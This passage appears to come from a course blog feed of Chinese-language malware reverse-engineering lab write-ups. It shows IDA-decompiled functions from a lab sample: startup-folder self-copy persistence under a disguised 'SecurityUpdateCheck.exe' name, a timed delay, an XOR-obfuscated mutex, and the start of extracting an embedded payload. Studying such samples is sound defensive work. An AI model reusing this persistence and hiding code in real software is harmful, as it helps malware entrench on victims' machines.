&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> ugly_matrix_multiplication(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)space_1,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)space), &lt;span style="color:#75715e">// guess_cipher的大小是196
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 他會把我們輸入的東西和他原本的東西一起送到guess_encrypt的這個function中
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">!&lt;/span>memcmp((&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)result[&lt;span style="color:#ae81ff">1&lt;/span>], verify_key, size)) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;:(&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA Ugly Function&lt;/p></description></item><item><title>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</guid><description>&lt;h1 id="simple-reverse---0x162023-lab---winmalware---sub_140001c80">
 Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)
 &lt;a class="anchor" href="#simple-reverse---0x162023-lab---winmalware---sub_140001c80">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234.001}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea">GetModuleFileNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-getusernamea">GetUserNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-copyfilea">CopyFileA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesa">SetFileAttributesA&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Main Function
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Sleep(&lt;span style="color:#ae81ff">0x1B7740u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001C80();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001030();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001120();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001BF0();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sub_140001C80
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>DWORD &lt;span style="color:#a6e22e">sub_140001C80&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD result; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> size_t v1; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// [rsp+20h] [rbp-258h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>lpNewFileName; &lt;span style="color:#75715e">// [rsp+28h] [rbp-250h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD pcbBuffer[&lt;span style="color:#ae81ff">4&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-248h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Buffer[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+40h] [rbp-238h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Filename[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+150h] [rbp-128h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetModuleFileNameA(&lt;span style="color:#ae81ff">0&lt;/span>i64, Filename, &lt;span style="color:#ae81ff">0x104u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetUserNameA(Buffer, pcbBuffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( __CFADD__(pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>], v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>)malloc(v1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001350(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">+&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;C:&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Users&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">AppData&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Roaming&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Microsoft&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Windows&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Start Menu&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Programs&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Startup&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">SecurityUpdateCheck.exe&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Buffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> CopyFileA(Filename, lpNewFileName, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> SetFileAttributesA(lpNewFileName, &lt;span style="color:#ae81ff">0x26u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA sub_14001C80(解析版)&lt;/p></description></item><item><title>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</guid><description>&lt;h1 id="simple-reverse---0x172023-lab---winmalware---sub_140001030">
 Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)
 &lt;a class="anchor" href="#simple-reverse---0x172023-lab---winmalware---sub_140001030">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/timezoneapi/nf-timezoneapi-systemtimetofiletime">SystemTimeToFileTime&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createwaitabletimerw">CreateWaitableTimerW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-setwaitabletimer">SetWaitableTimer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001030
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">waitUntil20231118&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE Result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hTimer; &lt;span style="color:#75715e">// [rsp+30h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> SYSTEMTIME SystemTime; &lt;span style="color:#75715e">// [rsp+38h] [rbp-30h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_FILETIME&lt;/span> FileTime; &lt;span style="color:#75715e">// [rsp+48h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LARGE_INTEGER DueTime; &lt;span style="color:#75715e">// [rsp+50h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wYear &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2023&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMonth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDay &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDayOfWeek &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wHour &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMinute &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wSecond &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMilliseconds &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SystemTimeToFileTime(&lt;span style="color:#f92672">&amp;amp;&lt;/span>SystemTime, &lt;span style="color:#f92672">&amp;amp;&lt;/span>FileTime);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DueTime &lt;span style="color:#f92672">=&lt;/span> FileTime;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Result &lt;span style="color:#f92672">=&lt;/span> CreateWaitableTimerW(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hTimer &lt;span style="color:#f92672">=&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SetWaitableTimer(Result, &lt;span style="color:#f92672">&amp;amp;&lt;/span>DueTime, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> WaitForSingleObject(hTimer, &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>攻擊者的完整意圖&lt;/p></description></item><item><title>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</guid><description>&lt;h1 id="simple-reverse---0x182023-lab---winmalware---sub_140001120">
 Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)
 &lt;a class="anchor" href="#simple-reverse---0x182023-lab---winmalware---sub_140001120">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。
Flag format: FLAG{mutex_name}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createmutexa">CreateMutexA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/sync/using-mutex-objects">使用 Mutex 物件&lt;/a>
&lt;blockquote>
&lt;p>可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/debug/system-error-codes--0-499-">系統錯誤碼 (0-499)&lt;/a>
&lt;blockquote>
&lt;p>ERROR_ALREADY_EXISTS
183 (0xB7)
無法建立檔案，該檔案已存在。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001120
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">sub_140001120&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{ 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE MutexA; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+20h] [rbp-78h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v3[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-68h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Name[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+38h] [rbp-60h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v5[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+58h] [rbp-40h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1684234874&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> qmemcpy(v5, &lt;span style="color:#f92672">&amp;amp;&lt;/span>unk_140003348, &lt;span style="color:#ae81ff">0x1Du&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Name[i] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v3 &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">^&lt;/span> v5[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MutexA &lt;span style="color:#f92672">=&lt;/span> CreateMutexA(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">1&lt;/span>, Name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(MutexA) &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">183&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> MutexA;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照&lt;code>0x64, 0x63, 0x62, 0x7A&lt;/code>的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor&lt;/p></description></item><item><title>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</guid><description>&lt;h1 id="simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">
 Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)
 &lt;a class="anchor" href="#simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。
Flag format: FLAG{462fe0000&amp;hellip;} (hex character must be lowercase)&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>DOS Header
&lt;img src="https://hackmd.io/_uploads/HJ9P9gpfp.png" alt="" />&lt;/li>
&lt;li>NT Headers - Optional Header
&lt;img src="https://hackmd.io/_uploads/SkjNqeazT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001870
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001870&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>pe_file, _QWORD &lt;span style="color:#f92672">*&lt;/span>pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
